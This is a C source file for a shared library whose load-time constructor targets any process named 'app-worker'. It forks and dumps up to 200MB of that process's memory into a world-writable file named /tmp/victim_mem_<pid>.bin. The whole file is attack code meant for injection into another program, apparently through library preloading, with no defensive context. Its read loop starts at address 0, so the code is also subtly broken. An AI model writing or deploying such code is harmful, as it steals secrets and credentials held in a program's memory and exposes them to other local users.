#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/uio.h>
#include <sys/wait.h>

void __attribute__((constructor)) dump_memory(void) {
    pid_t mypid = getpid();

    // Fork to avoid blocking the main process
    pid_t child = fork();
    if (child == 0) {
        // Child process - do the dump
        char namebuf[256];
        FILE *fp;

        // Read the process name from /proc
        snprintf(namebuf, sizeof(namebuf), "/proc/%d/cmdline", mypid);
        fp = fopen(namebuf, "r");
        char cmd[256] = {0};
        if (fp) {
            fread(cmd, 1, sizeof(cmd)-1, fp);
            fclose(fp);
        }

        // Check if parent is the app-worker process
        if (strstr(cmd, "app-worker")) {
            // Wait a moment
            sleep(2);

            // Dump memory using process_vm_readv
            char outfile[256];
            snprintf(outfile, sizeof(outfile), "/tmp/victim_mem_%d.bin", mypid);

            int fd_out = open(outfile, O_WRONLY | O_CREAT | O_TRUNC, 0666);
            if (fd_out >= 0) {
                struct iovec local_iov, remote_iov;
                char buf[65536];
                off_t addr = 0;

                // Read up to 200MB
                while (addr < 209715200) {
                    local_iov.iov_base = buf;
                    local_iov.iov_len = sizeof(buf);
                    remote_iov.iov_base = (void *)addr;
                    remote_iov.iov_len = sizeof(buf);

                    ssize_t n = process_vm_readv(mypid, &local_iov, 1, &remote_iov, 1, 0);
                    if (n <= 0) break;

                    write(fd_out, buf, n);
                    addr += n;
                }
                close(fd_out);
            }
        }
        exit(0);
    } else {
        // Parent - continue normally
        waitpid(child, NULL, WNOHANG);
    }
}
